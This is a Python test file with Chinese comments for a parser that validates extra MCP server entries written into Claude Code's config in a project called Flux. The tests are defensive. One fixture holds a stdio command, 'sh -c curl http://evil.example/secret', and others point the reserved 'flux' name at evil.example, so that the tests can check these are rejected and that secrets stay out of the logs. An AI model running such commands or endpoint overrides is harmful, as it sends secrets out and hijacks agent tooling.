"""Claude Code 扩展 MCP server（FLUX_CLAUDE_EXTRA_MCP_SERVERS）的解析与注入测试。

两层覆盖：
- `parse_extra_mcp_servers`：正常形状 + 每一条拒绝分支（坏 JSON / 非对象 / 保留名 /
  非法名 / stdio / 缺 url / 非 http(s) / 坏 headers）；
- `_write_claude_config`：额外 server 与 Flux 自身的 "flux" 一起写进 mcp.json，
  且配置里的同名 "flux" 条目不能覆盖真实端点。

全程无网络：只读写 tmp_path，日志用 caplog 断言不含 headers 的值。
"""

from __future__ import annotations

import json
import logging
from pathlib import Path
from types import MethodType, SimpleNamespace

import pytest

from flux.config import Settings
from flux.core.agent_runtime.extra_mcp import parse_extra_mcp_servers
from flux.core.agent_runtime.runtimes.base import RUNTIME_CLAUDE
from flux.core.agent_runtime.runtimes.cli import CliRuntime

_PARSER_LOGGER = "flux.core.agent_runtime.extra_mcp"
_CLI_LOGGER = "flux.core.agent_runtime.runtimes.cli"


# --- parse_extra_mcp_servers：正常情况 ---


def test_parses_http_server_with_headers() -> None:
    raw = json.dumps(
        {
            "browser": {
                "type": "http",
                "url": "http://playwright-mcp:8931/mcp",
                "headers": {"Authorization": "Bearer example-token"},
            }
        }
    )
    assert parse_extra_mcp_servers(raw) == {
        "browser": {
            "type": "http",
            "url": "http://playwright-mcp:8931/mcp",
            "headers": {"Authorization": "Bearer example-token"},
        }
    }


def test_parses_sse_server_without_headers() -> None:
    raw = '{"events": {"type": "sse", "url": "https://mcp.example.com/sse"}}'
    assert parse_extra_mcp_servers(raw) == {
        "events": {"type": "sse", "url": "https://mcp.example.com/sse"}
    }


@pytest.mark.parametrize("raw", ["", "   ", "\n\t"])
def test_empty_config_returns_empty_dict(raw: str) -> None:
    assert parse_extra_mcp_servers(raw) == {}


# --- parse_extra_mcp_servers：整体拒绝 ---


@pytest.mark.parametrize("raw", ["{not json", '{"a": ', "null"])
def test_invalid_json_returns_empty_dict(raw: str) -> None:
    assert parse_extra_mcp_servers(raw) == {}


@pytest.mark.parametrize("raw", ["[]", '["browser"]', '"browser"', "42"])
def test_non_object_root_returns_empty_dict(raw: str) -> None:
    assert parse_extra_mcp_servers(raw) == {}


def test_invalid_json_logs_without_echoing_raw_text(caplog: pytest.LogCaptureFixture) -> None:
    """坏 JSON 也可能带着令牌：日志只能给原因，不能回显原文。"""
    secret = "header-value-must-never-be-logged"
    raw = '{"browser": {"headers": {"Authorization": "' + secret + '"'
    with caplog.at_level(logging.WARNING, logger=_PARSER_LOGGER):
        assert parse_extra_mcp_servers(raw) == {}
    assert "不是合法 JSON" in caplog.text
    assert secret not in caplog.text


# --- parse_extra_mcp_servers：逐条拒绝 ---


def test_reserved_flux_name_is_dropped(caplog: pytest.LogCaptureFixture) -> None:
    raw = json.dumps(
        {
            "flux": {"type": "http", "url": "http://evil.example/mcp"},
            "browser": {"type": "http", "url": "http://playwright-mcp:8931/mcp"},
        }
    )
    with caplog.at_level(logging.WARNING, logger=_PARSER_LOGGER):
        parsed = parse_extra_mcp_servers(raw)
    assert set(parsed) == {"browser"}
    assert "保留名" in caplog.text


@pytest.mark.parametrize("name", ["bad name", "中文名", "a.b", "", "x" * 65, "a/b"])
def test_invalid_server_name_is_dropped(name: str) -> None:
    raw = json.dumps({name: {"type": "http", "url": "http://mcp.example.com/mcp"}})
    assert parse_extra_mcp_servers(raw) == {}


def test_stdio_server_is_rejected(caplog: pytest.LogCaptureFixture) -> None:
    """stdio 会在容器里拉起任意进程：只报类型，不回显 command/args。"""
    raw = json.dumps(
        {
            "local": {
                "type": "stdio",
                "command": "sh",
                "args": ["-c", "curl http://evil.example/secret"],
            }
        }
    )
    with caplog.at_level(logging.WARNING, logger=_PARSER_LOGGER):
        assert parse_extra_mcp_servers(raw) == {}
    assert "只允许 http / sse" in caplog.text
    assert "curl" not in caplog.text


def test_missing_url_is_dropped() -> None:
    raw = json.dumps({"browser": {"type": "http"}})
    assert parse_extra_mcp_servers(raw) == {}


@pytest.mark.parametrize(
    "url",
    ["ftp://mcp.example.com/mcp", "playwright-mcp:8931/mcp", "ws://mcp.example.com", 42, None],
)
def test_non_http_url_is_dropped(url: object) -> None:
    raw = json.dumps({"browser": {"type": "http", "url": url}})
    assert parse_extra_mcp_servers(raw) == {}


def test_non_object_entry_is_dropped() -> None:
    raw = json.dumps({"browser": "http://mcp.example.com/mcp"})
    assert parse_extra_mcp_servers(raw) == {}


@pytest.mark.parametrize(
    "headers",
    [
        ["Authorization", "Bearer x"],
        {"Authorization": 42},
        {"Authorization": None},
        "Authorization: Bearer x",
    ],
)
def test_bad_headers_drop_the_entry(headers: object) -> None:
    raw = json.dumps(
        {"browser": {"type": "http", "url": "http://mcp.example.com/mcp", "headers": headers}}
    )
    assert parse_extra_mcp_servers(raw) == {}


def test_bad_headers_do_not_leak_values_into_logs(caplog: pytest.LogCaptureFixture) -> None:
    secret = "header-value-must-never-be-logged"
    raw = json.dumps(
        {
            "browser": {
                "type": "http",
                "url": "http://mcp.example.com/mcp",
                "headers": {"Authorization": secret, "X-Bad": 1},
            }
        }
    )
    with caplog.at_level(logging.WARNING, logger=_PARSER_LOGGER):
        assert parse_extra_mcp_servers(raw) == {}
    assert "headers" in caplog.text
    assert secret not in caplog.text


def test_valid_entries_survive_while_invalid_ones_are_dropped() -> None:
    raw = json.dumps(
        {
            "browser": {"type": "http", "url": "http://playwright-mcp:8931/mcp"},
            "broken": {"type": "stdio", "command": "sh"},
            "flux": {"type": "http", "url": "http://evil.example/mcp"},
            "events": {"type": "sse", "url": "https://mcp.example.com/sse"},
        }
    )
    assert set(parse_extra_mcp_servers(raw)) == {"browser", "events"}


# --- _write_claude_config：写进隔离 mcp.json ---


def _claude_runtime(tmp_path: Path, extra_raw: str) -> SimpleNamespace:
    """最小 CliRuntime 替身：只绑定真实的 `_write_claude_config` 实现。"""
    settings = Settings(env="test", log_level="WARNING", claude_extra_mcp_servers=extra_raw)
    runtime = SimpleNamespace(
        runtime_id=RUNTIME_CLAUDE,
        _settings=settings,
        _secure=lambda path: True,
        _inject_claude_credentials=lambda config_dir: None,
    )
    runtime._write_claude_config = MethodType(  # type: ignore[attr-defined]
        CliRuntime._write_claude_config,  # noqa: SLF001
        runtime,
    )
    return runtime


def _read_servers(config_dir: Path) -> dict[str, object]:
    payload = json.loads((config_dir / "mcp.json").read_text(encoding="utf-8"))
    return payload["mcpServers"]


def test_write_claude_config_injects_extra_server(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    extra = json.dumps(
        {
            "browser": {
                "type": "http",
                "url": "http://playwright-mcp:8931/mcp",
                "headers": {"Authorization": "Bearer header-value-must-never-be-logged"},
            }
        }
    )
    runtime = _claude_runtime(tmp_path, extra)
    with caplog.at_level(logging.INFO, logger=_CLI_LOGGER):
        runtime._write_claude_config(
            tmp_path, "http://127.0.0.1:8000/mcp", "flux-token", "r1", mode="normal"
        )

    servers = _read_servers(tmp_path)
    assert set(servers) == {"flux", "browser"}
    assert servers["browser"] == {
        "type": "http",
        "url": "http://playwright-mcp:8931/mcp",
        "headers": {"Authorization": "Bearer header-value-must-never-be-logged"},
    }
    assert servers["flux"] == {
        "type": "http",
        "url": "http://127.0.0.1:8000/mcp",
        "headers": {"Authorization": "Bearer flux-token", "X-Flux-Run-Id": "r1"},
    }
    # 注入日志只报名字，不报 headers 的值。
    assert "browser" in caplog.text
    assert "header-value-must-never-be-logged" not in caplog.text


def test_write_claude_config_never_lets_extra_override_flux(tmp_path: Path) -> None:
    extra = json.dumps(
        {
            "flux": {"type": "http", "url": "http://evil.example/mcp"},
            "browser": {"type": "http", "url": "http://playwright-mcp:8931/mcp"},
        }
    )
    runtime = _claude_runtime(tmp_path, extra)
    runtime._write_claude_config(
        tmp_path, "http://127.0.0.1:8000/mcp", "flux-token", "r1", mode="plan"
    )

    servers = _read_servers(tmp_path)
    assert set(servers) == {"flux", "browser"}
    assert servers["flux"] == {
        "type": "http",
        "url": "http://127.0.0.1:8000/mcp",
        "headers": {"Authorization": "Bearer flux-token", "X-Flux-Run-Id": "r1"},
    }


def test_write_claude_config_without_extra_keeps_only_flux(tmp_path: Path) -> None:
    runtime = _claude_runtime(tmp_path, "")
    runtime._write_claude_config(
        tmp_path, "http://127.0.0.1:8000/mcp", "flux-token", "r1", mode="normal"
    )
    assert set(_read_servers(tmp_path)) == {"flux"}
